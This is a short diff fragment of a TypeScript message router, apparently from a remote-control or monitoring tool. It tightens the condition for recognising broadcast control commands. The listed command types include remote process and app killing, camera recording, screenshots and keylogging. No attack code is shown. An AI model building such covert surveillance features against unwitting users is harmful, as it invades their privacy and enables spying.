@@ -93,7 +93,7 @@ export class RouteHandler {
             }
         }
 
-        const isControlCommand = msg.to || msg.to === 'ALL' || 
+        const isControlCommand = (msg.to && msg.to === 'ALL') || 
             [CommandType.APP_LIST, CommandType.APP_START, CommandType.APP_KILL,
              CommandType.PROC_LIST, CommandType.PROC_START, CommandType.PROC_KILL,
              CommandType.CAM_RECORD, CommandType.SCREENSHOT, CommandType.START_KEYLOG,
